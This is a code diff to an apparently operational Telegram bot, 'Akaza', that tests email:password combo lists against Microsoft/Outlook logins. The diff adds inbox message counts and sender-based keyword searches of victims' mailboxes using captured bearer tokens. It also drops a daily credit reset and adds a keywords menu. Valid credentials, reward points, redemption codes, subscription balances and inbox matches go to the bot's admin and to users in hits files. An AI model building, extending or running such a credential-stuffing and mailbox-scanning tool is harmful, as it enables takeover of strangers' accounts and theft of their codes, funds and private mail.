@@ -71,8 +71,7 @@ class AkazaDatabase:
                 total_checks INTEGER DEFAULT 0,
                 total_hits INTEGER DEFAULT 0,
                 join_date TEXT,
-                access_expiry TEXT,
-                last_reset_date TEXT
+                access_expiry TEXT
             )
         ''')
         self._execute('''
@@ -95,22 +94,13 @@ class AkazaDatabase:
         ''')
 
     def add_user(self, uid, username, first_name):
-        now = datetime.now().isoformat()
         self._execute('''
-            INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, last_reset_date, credits)
-            VALUES (?, ?, ?, ?, ?, 2000)
-        ''', (uid, username, first_name, now, now))
+            INSERT OR IGNORE INTO users (user_id, username, first_name, join_date)
+            VALUES (?, ?, ?, ?)
+        ''', (uid, username, first_name, datetime.now().isoformat()))
         self._execute('''
             INSERT OR IGNORE INTO settings (user_id) VALUES (?)
         ''', (uid,))
-
-    def check_and_reset_credits(self, uid):
-        if uid == ADMIN_ID: return
-        res = self._execute('SELECT last_reset_date FROM users WHERE user_id = ?', (uid,), fetchone=True)
-        if res and res[0]:
-            last_reset = datetime.fromisoformat(res[0])
-            if datetime.now() - last_reset > timedelta(days=1):
-                self._execute('UPDATE users SET credits = 2000, last_reset_date = ? WHERE user_id = ?', (datetime.now().isoformat(), uid))
 
     def is_banned(self, uid):
         res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
@@ -524,24 +514,42 @@ class AkazaChecker:
         except: pass
         return {"owned": False}
 
-    def scan_inbox(self, access_token, cid, user_keywords):
+    def extract_inbox_count(self, text):
+        try:
+            patterns = [r'"DisplayName":"Inbox","TotalCount":(\d+)', r'"TotalCount":(\d+)', r'Inbox","TotalCount":(\d+)']
+            for pattern in patterns:
+                match = re.search(pattern, text)
+                if match: return match.group(1)
+        except: pass
+        return "0"
+
+    def scan_inbox(self, email, access_token, cid, user_keywords):
+        inbox_count = "0"
+        try:
+            h_count = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": str(uuid.uuid4()), "x-req-source": "Mini", "authorization": f"Bearer {access_token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "action": "StartupData", "content-type": "application/json"}
+            r_count = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers=h_count, timeout=15)
+            if r_count.status_code == 200: inbox_count = self.extract_inbox_count(r_count.text)
+        except: pass
+
         results = {}
         combined = list(set(list(SERVICE_KEYWORDS.keys()) + user_keywords))
         h = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
         for i in range(0, len(combined), 8):
-            batch = combined[i:i+8]; query = " OR ".join(batch)
+            batch = combined[i:i+8]
+            queries = [f'from:"{kw}" OR "{kw}"' if "@" in kw and " " not in kw else kw for kw in batch]
+            query = " OR ".join(queries)
             payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": query}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
             try:
                 r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h, timeout=10)
                 if r.status_code == 200 and r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0) > 0:
-                    for kw in batch:
-                        payload['EntityRequests'][0]['Query']['QueryString'] = kw
+                    for j, kw in enumerate(batch):
+                        payload['EntityRequests'][0]['Query']['QueryString'] = queries[j]
                         ri = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h, timeout=10)
                         if ri.status_code == 200:
                             ti = ri.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                             if ti > 0: name = SERVICE_KEYWORDS.get(kw, kw); results[name] = results.get(name, 0) + ti
             except: pass
-        return results
+        return results, inbox_count
 
     def check(self, email, password, user_keywords=[], fast_mode=False):
         urlPost, ppft = self.get_sftag_params()
@@ -558,16 +566,16 @@ class AkazaChecker:
         try: codes = self.get_redemption_codes()
         except: codes = []
         if fast_mode:
-            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[]}, 'name': '', 'country': '', 'mc': {"owned": False}, 'inbox': {}}
+            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[]}, 'name': '', 'country': '', 'mc': {"owned": False}, 'inbox': {}, 'inbox_count': '0'}
         try: subs = self.get_microsoft_subs()
         except: subs = {"status":"FREE","subs":[]}
         try: name, country = self.get_profile(tk, cid)
         except: name, country = "", ""
         try: mc = self.get_minecraft(tk)
         except: mc = {"owned": False}
-        try: inbox = self.scan_inbox(tk, cid, user_keywords)
-        except: inbox = {}
-        return {'status': 'hit', 'email': email, 'password': password, 'name': name, 'country': country, 'pts': pts, 'codes': codes, 'subs': subs, 'mc': mc, 'inbox': inbox}
+        try: inbox, inbox_count = self.scan_inbox(email, tk, cid, user_keywords)
+        except: inbox, inbox_count = {}, '0'
+        return {'status': 'hit', 'email': email, 'password': password, 'name': name, 'country': country, 'pts': pts, 'codes': codes, 'subs': subs, 'mc': mc, 'inbox': inbox, 'inbox_count': inbox_count}
 
 # SECTION 7 — Telegram Bot Handlers
 class AkazaBot:
@@ -580,7 +588,6 @@ class AkazaBot:
     async def check_user(self, update: Update):
         uid = update.effective_user.id
         akaza_db.add_user(uid, update.effective_user.username, update.effective_user.first_name)
-        akaza_db.check_and_reset_credits(uid)
         if akaza_db.is_banned(uid):
             await update.message.reply_text("❌ You are banned from using this bot.")
             return False
@@ -604,13 +611,14 @@ class AkazaBot:
             f"👤 *User:* `{update.effective_user.first_name}`\n"
             f"🆔 *ID:* `{uid}`\n"
             f"🎖 *Role:* `{role}`\n"
-            f"💰 *Credits:* `{cred}`/2000 (Daily Reset)\n"
+            f"💰 *Credits:* `{cred}`\n"
             f"👑 *Admin:* @Akaza_admin\n\n"
             "📥 *Send a .txt combo (email:pass) or text to start checking.*"
         )
         kbd = [
             [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
-            [InlineKeyboardButton("🔌 Proxy", callback_data="proxy"), InlineKeyboardButton("🆘 Help", callback_data="help")]
+            [InlineKeyboardButton("🔍 Keywords", callback_data="keywords"), InlineKeyboardButton("🔌 Proxy", callback_data="proxy")],
+            [InlineKeyboardButton("🆘 Help", callback_data="help")]
         ]
         await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kbd))
 
@@ -676,7 +684,7 @@ class AkazaBot:
             now = time.time()
             if not force and now - info['last_time'] < 3: return
             async with info['lock']:
-                hits_text = "\n".join([f"✅ `{h['email']}` | {h['pts']} Pts" for h in last_hits[-5:]])
+                hits_text = "\n".join([f"✅ `{h['email']}` | {h['pts']} Pts | 📥 {h['inbox_count']}" for h in last_hits[-5:]])
                 text = (
                     f"⚡ *Checking in Progress...*\n\n"
                     f"📈 *Progress:* `{checked}/{total}`\n"
@@ -714,7 +722,7 @@ class AkazaBot:
                     akaza_db.save_result(uid, email, 'hit', res)
                     # Admin Log for Hits
                     try:
-                        log_msg = f"🔥 *HIT:* `{email}:{password}`\n👤 *User:* `{update.effective_user.username or uid}`\n💰 *Pts:* `{res['pts']}`\n🎁 *Codes:* {len(res['codes'])}\n🎮 *MC:* {'Yes' if res['mc']['owned'] else 'No'}"
+                        log_msg = f"🔥 *HIT:* `{email}:{password}`\n👤 *User:* `{update.effective_user.username or uid}`\n💰 *Pts:* `{res['pts']}`\n📥 *Inbox:* `{res['inbox_count']}`\n🎁 *Codes:* {len(res['codes'])}\n🎮 *MC:* {'Yes' if res['mc']['owned'] else 'No'}"
                         await context.bot.send_message(chat_id=ADMIN_ID, text=log_msg, parse_mode='Markdown')
                     except: pass
                 elif res['status'] == 'bad': bad += 1
@@ -731,14 +739,15 @@ class AkazaBot:
         final_file = f"hits_{uid}_{int(time.time())}.txt"
         with open(final_file, 'w') as f:
             for h in last_hits:
-                f.write(f"Email: {h['email']}\nPassword: {h['password']}\nName: {h['name']}\nCountry: {h['country']}\nPoints: {h['pts']}\n")
+                f.write(f"Email: {h['email']}\nPassword: {h['password']}\nName: {h['name']}\nCountry: {h['country']}\nPoints: {h['pts']}\nInbox Count: {h['inbox_count']}\n")
                 f.write(f"Subs: {h['subs']['status']} | Balance: {h['subs']['balance']}\n")
                 f.write(f"Minecraft: {'Yes' if h['mc']['owned'] else 'No'}\n")
                 if h['codes']:
                     f.write("Codes:\n")
                     for c in h['codes']: f.write(f" - {c['code']} ({c['info']}) {c['redemption_url']}\n")
                 if h['inbox']:
-                    f.write(f"Inbox: {json.dumps(h['inbox'])}\n")
+                    f.write("Inbox Hits:\n")
+                    for k, v in h['inbox'].items(): f.write(f" - {k}: {v}\n")
                 f.write("-" * 30 + "\n\n")
 
         await update.message.reply_document(document=open(final_file, 'rb'), caption=f"🏁 *Check Completed!*\n✅ Total Hits: {hits}")
@@ -877,10 +886,11 @@ class AkazaBot:
                 f"👤 *Name:* `{res['name']}`\n"
                 f"🌍 *Country:* `{res['country']}`\n"
                 f"💰 *Points:* `{res['pts']}`\n"
+                f"📥 *Inbox:* `{res['inbox_count']}`\n"
                 f"🎁 *Codes:* `{len(res['codes'])}`\n"
                 f"💳 *Subs:* `{res['subs']['status']}` ({res['subs']['balance']})\n"
                 f"🎮 *Minecraft:* `{'Yes' if res['mc']['owned'] else 'No'}`\n\n"
-                f"📥 *Inbox:* `{json.dumps(res['inbox'])}`"
+                f"🔍 *Matches:* `{json.dumps(res['inbox'])}`"
             )
             await msg.edit_text(text, parse_mode='Markdown')
         elif res['status'] == '2fa':
@@ -912,7 +922,8 @@ class AkazaBot:
     async def add_keyword(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await self.check_user(update): return
         if not context.args: return
-        new_kws = [k.strip() for k in " ".join(context.args).split(',')]
+        raw = " ".join(context.args)
+        new_kws = [k.strip() for k in re.split(r'[,\s]+', raw) if k.strip()]
         s = akaza_db.get_user_settings(update.effective_user.id)
         current = s['keywords']
         updated = list(set(current + new_kws))
@@ -940,6 +951,10 @@ class AkazaBot:
         elif query.data == "proxy":
             px_count = len(self.user_proxies.get(uid, []))
             await query.edit_message_text(f"🔌 *Proxy Management*\n\nStatus: `{px_count}` proxies loaded.\n\nTo use proxies, upload a `.txt` file containing your proxies. Proxies are only used for **one** session and then cleared.\n\n*Format:* `ip:port` or `ip:port:user:pass`", parse_mode='Markdown')
+        elif query.data == "keywords":
+            s = akaza_db.get_user_settings(uid)
+            kws = ", ".join(s['keywords']) or "None"
+            await query.edit_message_text(f"🔍 *Inbox Keywords*\n\nCurrent: `{kws}`\n\nUse `/addkw k1,k2` to add or `/clearkw` to reset.\nYou can also send keywords separated by spaces or commas.", parse_mode='Markdown')
 
     def run(self):
         self.app.add_handler(CommandHandler("start", self.start))
